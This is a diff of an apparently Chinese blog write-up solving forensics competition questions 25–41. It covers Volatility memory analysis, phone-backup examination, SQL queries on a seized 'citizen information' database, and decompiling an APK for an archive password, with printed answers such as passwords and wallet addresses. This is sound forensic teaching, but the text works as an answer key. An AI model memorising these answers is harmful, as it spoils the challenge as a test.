-&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;检材三计算机内存镜像&#34;&gt;检材三(计算机内存镜像)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0.2
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;检材三计算机内存镜像&#34;&gt;检材三(计算机内存镜像)
 &lt;/h1&gt;&lt;h2 id=&#34;25检材三中进程ftk-imagerexe的-pid-是多少&#34;&gt;25.检材三中进程&amp;quot;FTK Imager.exe&amp;quot;的 PID 是多少
 &lt;/h2&gt;&lt;p&gt;不知道为什么我的volatility2不能分析出win10的结果，只好使用volatility3：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 vol.py -f ../memdump2023.raw windows.pslist.PsList | grep FTK
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709195208579.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 vol.py -f ../memdump2023.raw windows.pslist.PsList | grep FTK
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709195208579.png&#34;
 	
 	
 	
@@ -396,10 +396,10 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;11328
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;26检材三中显示的系统时间是多少格式-yyyy-mm-dd-hhmmss&#34;&gt;26.检材三中显示的系统时间是多少?(格式: YYYY-MM-DD HH:MM:SS)
-&lt;/h2&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 vol.py -f ../memdump2023.raw windows.info.Info  
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709211018795.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;11328
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;26检材三中显示的系统时间是多少格式-yyyy-mm-dd-hhmmss&#34;&gt;26.检材三中显示的系统时间是多少?(格式: YYYY-MM-DD HH:MM:SS)
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 vol.py -f ../memdump2023.raw windows.info.Info  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709211018795.png&#34;
 	
 	
 	
@@ -409,10 +409,10 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; 2023-12-12 04:06:25
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;27检材三中记录的当前系统ip是多少&#34;&gt;27.检材三中记录的当前系统ip是多少?
-&lt;/h2&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 vol.py -f ../memdump2023.raw windows.netscan.NetScan
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709200824096.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 2023-12-12 04:06:25
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;27检材三中记录的当前系统ip是多少&#34;&gt;27.检材三中记录的当前系统ip是多少?
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 vol.py -f ../memdump2023.raw windows.netscan.NetScan
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709200824096.png&#34;
 	
 	
 	
@@ -422,8 +422,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;172.18.7.229
-&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;检材四-红米手机备份数据&#34;&gt;检材四 (红米手机备份数据)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;172.18.7.229
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;检材四-红米手机备份数据&#34;&gt;检材四 (红米手机备份数据)
 &lt;/h1&gt;&lt;h2 id=&#34;28检材四中迅雷下载过的文件名是什么&#34;&gt;28.检材四中迅雷下载过的文件名是什么?
 &lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 迅雷 -&amp;gt; 云盘 -&amp;gt; 离线下载目录：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709193648459.png&#34;
@@ -436,8 +436,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;《向银河靠近》.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;29检材四中安装了哪些可是实现翻墙vpn功能的-app&#34;&gt;29.检材四中安装了哪些可是实现翻墙(VPN)功能的 app?
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;《向银河靠近》.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;29检材四中安装了哪些可是实现翻墙vpn功能的-app&#34;&gt;29.检材四中安装了哪些可是实现翻墙(VPN)功能的 app?
 &lt;/h2&gt;&lt;p&gt;没啥说的：
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709193825301.png&#34;
 	
@@ -449,8 +449,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;clash
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;30检材四备份的设备系统版本是多少&#34;&gt;30.检材四备份的设备系统版本是多少?
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;clash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;30检材四备份的设备系统版本是多少&#34;&gt;30.检材四备份的设备系统版本是多少?
 &lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息-&amp;gt; 设备信息 -&amp;gt; 厂商版本：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709193935053.png&#34;
 	
@@ -462,11 +462,11 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; V14.0.2.0.TKSCNXM
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;31检材四备份的时间是多少答案以-13-位时间戳表示&#34;&gt;31.检材四备份的时间是多少(答案以 13 位时间戳表示)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; V14.0.2.0.TKSCNXM
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;31检材四备份的时间是多少答案以-13-位时间戳表示&#34;&gt;31.检材四备份的时间是多少(答案以 13 位时间戳表示)
 &lt;/h2&gt;&lt;p&gt;同上题图，转换时间戳（2023-12-13 17:20:32）：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1702459232429
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;32检材四中-filecompress-app-包名是什么&#34;&gt;32.检材四中 FileCompress app 包名是什么?
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1702459232429
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;32检材四中-filecompress-app-包名是什么&#34;&gt;32.检材四中 FileCompress app 包名是什么?
 &lt;/h2&gt;&lt;p&gt;包名就在检材里面列出，复制黏贴就行：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709195000907.png&#34;
 	
@@ -478,8 +478,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;com.zs.filecompress
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;33检材四中备忘录记录的内容是什么&#34;&gt;33.检材四中备忘录记录的内容是什么?
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;com.zs.filecompress
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;33检材四中备忘录记录的内容是什么&#34;&gt;33.检材四中备忘录记录的内容是什么?
 &lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息-&amp;gt; 便签：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709194341673.png&#34;
 	
@@ -491,8 +491,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Vcpswd:edgewallet
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;34请列出检材四中所有虚拟币钱包-app-的包名-如有多个用顿号分隔&#34;&gt;34.请列出检材四中所有虚拟币钱包 app 的包名, 如有多个用顿号分隔
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Vcpswd:edgewallet
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;34请列出检材四中所有虚拟币钱包-app-的包名-如有多个用顿号分隔&#34;&gt;34.请列出检材四中所有虚拟币钱包 app 的包名, 如有多个用顿号分隔
 &lt;/h2&gt;&lt;p&gt;直接搜索检材里的app，一共六个：
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709195051880.png&#34;
 	
@@ -507,8 +507,8 @@
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;de.schildbach.wallet、com.bitcoin.mwallet、 piuk.blockchain.android、im.token.app、com.paxful.wallet、pro.huobi
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;35检材四中嫌疑人使用-bitcoin-wallet-钱包地址是什么&#34;&gt;35.检材四中嫌疑人使用 Bitcoin Wallet 钱包地址是什么?
 &lt;/h2&gt;&lt;p&gt;在下面路径中找到并导出日志文件：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Bitcoin Wallet(de.schildbach.wallet).bak/apps/de.schildbach.wallet/f/log/wallet.log
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709200125980.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bitcoin Wallet(de.schildbach.wallet).bak/apps/de.schildbach.wallet/f/log/wallet.log
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709200125980.png&#34;
 	
 	
 	
@@ -529,10 +529,9 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;bc1q4ru3a8r0vzymwwcmawvtdyf6hkvt2x9477hjkt
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;36md5-值为ff3dabd0a610230c2486bffbe15e5dff的文件在检材四中的位置&#34;&gt;36.MD5 值为&amp;quot;FF3DABD0A610230C2486BFFBE15E5DFF&amp;quot;的文件在检材四中的位置
-&lt;/h2&gt;&lt;p&gt;这一题据说是结合前面提到的FileCompress一路找下去就能发现，不过太电波了&lt;/p&gt;
-&lt;p&gt;这里更好的办法是用HashMyFiles，全部算一遍再搜索：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bc1q4ru3a8r0vzymwwcmawvtdyf6hkvt2x9477hjkt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;36md5-值为ff3dabd0a610230c2486bffbe15e5dff的文件在检材四中的位置&#34;&gt;36.MD5 值为&amp;quot;FF3DABD0A610230C2486BFFBE15E5DFF&amp;quot;的文件在检材四中的位置
+&lt;/h2&gt;&lt;p&gt;这一题据说是结合前面提到的FileCompress一路找下去就能发现，不过太电波了：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709202128966.png&#34;
 	
 	
@@ -543,8 +542,43 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;FileCompress(com.zs.filecompress).bak\FileCompress\11月.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;综合题目&#34;&gt;综合题目
+&lt;p&gt;这里更好的办法是用HashMyFiles，全部算一遍再搜索&lt;/p&gt;
+&lt;p&gt;然而我不知道怎么使用这个工具，好在火眼有类似的功能&lt;/p&gt;
+&lt;p&gt;文件 -&amp;gt; 检材四 -&amp;gt; 文件系统 -&amp;gt; 勾选所有文件 -&amp;gt; 右键新建哈希集 -&amp;gt; 勾选项：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710124643356.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250710124643356&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;创建的新建哈希集任务完成后，选择高级，在文件哈希处输入MD5，过滤范围选择子目录：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710124613331.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250710124613331&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;成功找到目标文件：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710125044835.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250710125044835&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;20231213_172032.tar/FileCompress(com.zs.filecompress).bak/FileCompress/11月.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;综合题目&#34;&gt;综合题目
 &lt;/h1&gt;&lt;h2 id=&#34;37检材中受害人的微信号是多少&#34;&gt;37.检材中受害人的微信号是多少?
 &lt;/h2&gt;&lt;p&gt;检材二 -&amp;gt; 微信 -&amp;gt; 好友消息，根据聊天记录能判断出受害者就是小浩：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709202302479.png&#34;
@@ -557,8 +591,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;B-I-N-A-R-Y
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;38嫌疑人曾通过微信购买过一个公民信息数据库-该数据库中手机尾号是-8686-的用户的姓名是&#34;&gt;38.嫌疑人曾通过微信购买过一个公民信息数据库, 该数据库中手机尾号是 8686 的用户的姓名是
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;B-I-N-A-R-Y
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;38嫌疑人曾通过微信购买过一个公民信息数据库-该数据库中手机尾号是-8686-的用户的姓名是&#34;&gt;38.嫌疑人曾通过微信购买过一个公民信息数据库, 该数据库中手机尾号是 8686 的用户的姓名是
 &lt;/h2&gt;&lt;p&gt;从另一个微信好友里面能发现购买数据库的名称为database.sqlite：
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709202654797.png&#34;
 	
@@ -582,8 +616,21 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;链接数据库后查找：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;章敏
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;39嫌疑人手机中是否保存了小西米语音-app-的账号密码-如有-请写出其密码&#34;&gt;39.嫌疑人手机中是否保存了小西米语音 app 的账号密码, 如有, 请写出其密码
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;phone&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;LIKE&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;%8686&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710130255431.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250710130255431&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;章敏
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;39嫌疑人手机中是否保存了小西米语音-app-的账号密码-如有-请写出其密码&#34;&gt;39.嫌疑人手机中是否保存了小西米语音 app 的账号密码, 如有, 请写出其密码
 &lt;/h2&gt;&lt;p&gt;加密iOS备份 -&amp;gt; 钥匙串 -&amp;gt; 网站与应用密码，我们已经知道小西米的包名&lt;code&gt;com.titashow.tangliao&lt;/code&gt;：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709203150613.png&#34;
 	
@@ -595,15 +642,25 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; jamvU1@wiwgug$bo
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;40公民信息数据库中-截止到-2023-年-12-月-31-日-年龄大于等于-18-且小于等于-30-岁之间的用户信息数量&#34;&gt;40.公民信息数据库中, 截止到 2023 年 12 月 31 日, 年龄大于等于 18 且小于等于 30 岁之间的用户信息数量
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; jamvU1@wiwgug$bo
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;40公民信息数据库中-截止到-2023-年-12-月-31-日-年龄大于等于-18-且小于等于-30-岁之间的用户信息数量&#34;&gt;40.公民信息数据库中, 截止到 2023 年 12 月 31 日, 年龄大于等于 18 且小于等于 30 岁之间的用户信息数量
 &lt;/h2&gt;&lt;p&gt;在38题中得到的database数据库里进行查询：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;count&lt;/span&gt;(&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; (&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;2023&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;substr&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;IDCARD&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;4&lt;/span&gt;)) &lt;span style=&#34;color:#c678dd&#34;&gt;between&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;30&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到结果：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-sq&#34; data-lang=&#34;sq&#34;&gt;1717
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;41受害人小浩的手机号码是多少&#34;&gt;41.受害人小浩的手机号码是多少
+&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710130337805.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250710130337805&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1717
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;41受害人小浩的手机号码是多少&#34;&gt;41.受害人小浩的手机号码是多少
 &lt;/h2&gt;&lt;p&gt;在上面的数据库中没有找到叫小浩的人，微信和短信也没有小浩的联系方式&lt;/p&gt;
 &lt;p&gt;结果是之前找到的11月.txt是受害者名单，怎么发现的呢？&lt;/p&gt;
 &lt;p&gt;在检材1的20231212.E01/分区6/Users/rd/Documents下有一个新建文本文档.txt，有80+MB&lt;/p&gt;
@@ -641,7 +698,20 @@
 	
 	
 &gt;九月是未加密的txt文件，十月却不是txt文件，而是一个pk开头的压缩包，应该是和11月一样的加密方式&lt;/p&gt;
-&lt;p&gt;压缩包密码藏在了FileCompress软件中，jadx逆向得到&lt;code&gt;1!8Da9Re5it2b3a.&lt;/code&gt;，解密10月和11月：&lt;/p&gt;
+&lt;p&gt;压缩包密码藏在了FileCompress软件中，找出软件安装包（apk）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FileCompress(com.zs.filecompress).bak/apps/com.zs.filecompress/a
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;导出后，使用jadx逆向：&lt;/p&gt;
